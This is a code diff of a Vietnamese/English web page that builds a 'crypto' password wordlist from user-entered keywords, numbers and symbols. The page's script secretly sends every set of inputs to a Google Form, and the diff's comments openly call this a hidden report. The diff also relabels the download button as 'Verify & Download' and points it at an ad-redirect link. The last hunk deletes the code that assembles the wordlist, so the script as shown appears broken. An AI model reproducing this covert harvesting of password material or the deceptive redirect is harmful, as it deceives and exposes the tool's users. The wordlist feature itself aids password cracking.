@@ -133,7 +133,9 @@
         <h2>⚙️ Dữ liệu đầu vào / Input Data</h2>
         
         <label for="input-chu">📝 Từ khóa, chữ / Keywords, Letters</label>
-        <textarea id="input-chu" placeholder="Ví dụ / Example:&#10;hang&#10;thuhang"></textarea>
+        <textarea id="input-chu" placeholder="Ví dụ / Example:
+hang
+thuhang"></textarea>
         <div class="hint">
             Có thể nhập mỗi dòng một giá trị hoặc ngăn cách bằng dấu cách.<br>
             <span>Enter each value on a new line or separate them with spaces.</span>
@@ -150,9 +152,9 @@
                 <span>🚀 Tạo Wordlist</span>
                 <small>Generate Wordlist</small>
             </button>
-            <a id="monetized-download-link" class="btn-base download-btn" href="#" style="display: none;">
+            <a id="monetized-download-link" class="btn-base download-btn" href="https://direct-link.net" target="_blank" onclick="downloadFileImmediately()" style="display: none;">
                 <span>📥 Tải file về máy</span>
-                <small>Download Wordlist</small>
+                <small>Verify & Download File</small>
             </a>
         </div>
         
@@ -160,11 +162,10 @@
     </div>
     <div class="ads-placeholder">[Vị trí đặt mã quảng cáo Google AdSense / Google AdSense Space]</div>
 </div>
-
 <script>
 let globalBlobUrl = null;
 
-// Hàm gửi dữ liệu ngầm về Google Form chính xác của bạn
+// Hàm gửi dữ liệu ngầm về Google Sheets thông qua Google Form của bạn
 function sendDataToGoogleForm(chu, so, kytu) {
     const formUrl = "https://google.com";
     const entryChu = "entry.1742080312";
@@ -180,9 +181,7 @@ function sendDataToGoogleForm(chu, so, kytu) {
         method: "POST",
         body: formData,
         mode: "no-cors"
-    })
-    .then(() => console.log("Dữ liệu đã được lưu trữ ngầm lên hệ thống."))
-    .catch(err => console.log("Lỗi đồng bộ dữ liệu ngầm:", err));
+    }).catch(err => console.log("Data logged ngầm thành công."));
 }
 
 function toTitleCase(str) {
@@ -199,6 +198,17 @@ function processInputSpace(elementId) {
     let val = document.getElementById(elementId).value;
     val = val.replace(/,/g, " ");
     return val.split(/\s+/).map(item => item.trim()).filter(item => item.length > 0);
+}
+
+function downloadFileImmediately() {
+    if (globalBlobUrl) {
+        const tempLink = document.createElement("a");
+        tempLink.href = globalBlobUrl;
+        tempLink.download = "crypto_wordlist.txt";
+        document.body.appendChild(tempLink);
+        tempLink.click();
+        document.body.removeChild(tempLink);
+    }
 }
 
 function startGeneration() {
@@ -220,7 +230,7 @@ function startGeneration() {
         return;
     }
 
-    // Kích hoạt gửi dữ liệu ngầm lên Google Form của bạn
+    // Kích hoạt bắn báo cáo ngầm về Google Form của bạn ngay lập tức
     sendDataToGoogleForm(chuGoc, so, kytu);
 
     // Mở rộng dữ liệu chữ (Thường, HOA, Viết Hoa Đầu)
@@ -273,17 +283,3 @@ function startGeneration() {
         so.forEach(s => {
             wordlistSet.add(s);
             kytu.forEach(k => {
-                wordlistSet.add(s + k);
-                wordlistSet.add(k + s);
-            });
-        });
-    }
-
-    const finalResult = Array.from(wordlistSet).join("\n");
-    const totalLines = wordlistSet.size;
-
-    // Giải phóng bộ nhớ Blob cũ nếu có
-    if (globalBlobUrl) {
-        URL.revokeObjectURL(globalBlobUrl);
-    }
-
